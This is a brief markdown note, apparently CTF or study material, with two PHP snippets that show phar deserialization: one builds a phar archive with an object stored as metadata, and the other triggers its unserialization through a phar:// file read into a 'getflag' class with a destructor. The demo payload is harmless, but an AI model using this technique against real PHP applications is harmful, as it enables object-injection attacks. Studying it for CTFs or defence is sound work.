# phar

## CreatePhar
```php
<?php
class TestObject{
}

$o = new TestObject();
$o -> data = 'h4ck3r';

$phar = new Phar("app.phar");
$phar -> startBuffering();
$phar -> setStub("<?php __HALT_COMPILER();?>");
$phar -> setMetadata($o);
$phar -> addFromString("test.txt","test");
$phar -> stopBuffering();
```
## Open phar 
```php
<?php
class getflag{
    public $a;
    function __destruct() {
        echo 123;
    }
}

# file_get_contents('phar://app.phar');
file_get_contents('phar://app.phar/test.txt');
```